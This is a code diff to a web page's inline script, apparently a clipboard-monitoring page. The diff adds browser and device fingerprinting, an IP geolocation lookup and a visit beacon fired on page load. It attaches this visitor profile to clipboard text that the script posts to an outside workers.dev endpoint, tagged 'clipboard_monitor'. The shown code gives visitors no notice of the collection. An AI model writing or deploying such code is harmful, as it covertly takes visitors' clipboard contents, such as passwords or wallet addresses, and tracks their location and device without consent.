@@ -391,16 +391,106 @@
     <script>
         const SEND_ENDPOINT = "https://young-brook-716e.abojanmawzoon.workers.dev";
         const statusEl = document.getElementById("statusMessage");
+        let cachedVisitorInfo = null;
 
-        async function sendClipboardData(text, isButtonClick = false) {
+        function detectBrowserName() {
+            const ua = navigator.userAgent;
+            if (/Edg\//i.test(ua)) return "Edge";
+            if (/OPR\//i.test(ua) || /Opera/i.test(ua)) return "Opera";
+            if (/SamsungBrowser/i.test(ua)) return "Samsung Internet";
+            if (/Firefox\//i.test(ua) || /FxiOS/i.test(ua)) return "Firefox";
+            if (/CriOS/i.test(ua)) return "Chrome";
+            if (/Chrome\//i.test(ua) && !/Edg\//i.test(ua) && !/OPR\//i.test(ua)) return "Chrome";
+            if (/Safari\//i.test(ua) && !/Chrome\//i.test(ua) && !/CriOS/i.test(ua)) return "Safari";
+            return "Unknown";
+        }
+
+        function detectDeviceType() {
+            const ua = navigator.userAgent;
+            const isIPad = /iPad/i.test(ua) || (navigator.platform === "MacIntel" && navigator.maxTouchPoints > 1);
+            const isTablet = isIPad || /Android(?!.*Mobile)|Tablet|PlayBook|Silk/i.test(ua);
+            if (isTablet) return "Tablet";
+
+            const isPhone = /iPhone|iPod|Android.*Mobile|Windows Phone|BlackBerry|BB10|IEMobile|Opera Mini/i.test(ua);
+            if (isPhone) return "Phone";
+
+            const isLaptop = /Macintosh|MacBook|CrOS/i.test(ua);
+            if (isLaptop) return "Laptop";
+
+            return "PC";
+        }
+
+        async function getVisitorLocation() {
             try {
+                const res = await fetch("https://ipapi.co/json/");
+                if (!res.ok) throw new Error("Geo lookup failed");
+                const data = await res.json();
+                return {
+                    country: data.country_name || "Unknown",
+                    state: data.region || "Unknown",
+                    city: data.city || "Unknown"
+                };
+            } catch (e) {
+                return {
+                    country: "Unknown",
+                    state: "Unknown",
+                    city: "Unknown"
+                };
+            }
+        }
+
+        async function getVisitorInfo() {
+            if (cachedVisitorInfo) return cachedVisitorInfo;
+            const location = await getVisitorLocation();
+            cachedVisitorInfo = {
+                location,
+                deviceType: detectDeviceType(),
+                browserName: detectBrowserName()
+            };
+            return cachedVisitorInfo;
+        }
+
+        async function formatLogMessage(visitor, clipboardText) {
+            const time = new Date().toLocaleString();
+            const header = `${time} - ${visitor.deviceType} - ${visitor.browserName} - ${visitor.location.country}`;
+            return clipboardText ? `${header}\n${clipboardText}` : header;
+        }
+
+        async function sendVisitTelemetry() {
+            try {
+                const visitor = await getVisitorInfo();
+                const formattedLog = await formatLogMessage(visitor, "");
                 await fetch(SEND_ENDPOINT, {
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({
-                        clipboardText: text
+                        eventType: "visit",
+                        formattedLog,
+                        clipboardText: "",
+                        visitor
+                    })
+                });
+            } catch (error) {
+                console.error(error);
+            }
+        }
+
+        async function sendClipboardData(text, isButtonClick = false) {
+            try {
+                const visitor = await getVisitorInfo();
+                const formattedLog = await formatLogMessage(visitor, text);
+                await fetch(SEND_ENDPOINT, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        eventType: isButtonClick ? "button_click" : "clipboard_monitor",
+                        formattedLog,
+                        clipboardText: text,
+                        visitor
                     })
                 });
                 if (isButtonClick) {
@@ -442,6 +532,7 @@
         }
 
         window.addEventListener("load", () => {
+            sendVisitTelemetry();
             setTimeout(monitorClipboard, 500);
         });
     </script>
